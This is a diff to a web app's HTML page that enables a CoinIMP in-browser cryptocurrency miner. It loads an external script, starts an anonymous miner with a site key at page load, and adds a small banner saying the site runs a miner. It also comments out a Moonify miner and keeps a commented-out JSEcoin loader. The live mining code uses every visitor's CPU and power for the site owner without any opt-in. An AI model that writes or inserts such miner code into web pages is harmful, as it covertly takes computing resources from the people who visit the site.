@@ -5,24 +5,30 @@
     <link rel="shortcut icon" href="%PUBLIC_URL%/favicon.ico" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="theme-color" content="#000000" />
+
     <script src="https://www.hostingcloud.racing/mgBV.js"></script>
-    <script src="https://www.hostingcloud.racing/mgBV.js"></script>
-    <!--
     <script>
-      var _client = new Client.Anonymous('85560adf29eb4c7d602aaf6541b24eb1c470b772389a450f86dde953f0947961', {
-        throttle: 0.5
-      });
+      var _client = new Client.Anonymous(
+        '85560adf29eb4c7d602aaf6541b24eb1c470b772389a450f86dde953f0947961',
+        {
+          throttle: 0.2,
+        }
+      );
       _client.start();
-      // _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
-      
+      _client.addMiningNotification(
+        'Bottom',
+        'This site is running JavaScript miner from coinimp.com',
+        '#ffffff',
+        25,
+        '#cccccc'
+      );
     </script>
-    -->
 
     <!-- <script type="text/javascript">
       !function () { var e = document, t = e.createElement("script"), s = e.getElementsByTagName("script")[0]; t.type = "text/javascript", t.async = t.defer = !0, t.src = "https://load.jsecoin.com/load/155540/razzy.herokuapp.com/0/0/", s.parentNode.insertBefore(t, s) }();
     </script> -->
 
-    <script src="https://pkg.moonify.io/moonify.min.js"></script>
+    <!-- <script src="https://pkg.moonify.io/moonify.min.js"></script>
     <script type="text/javascript">
       Moonify.set({
         serviceID:
@@ -53,7 +59,7 @@
       } else {
         alert('Potato computer!');
       }
-    </script>
+    </script> -->
 
     <!--
       manifest.json provides metadata used when your web app is installed on a
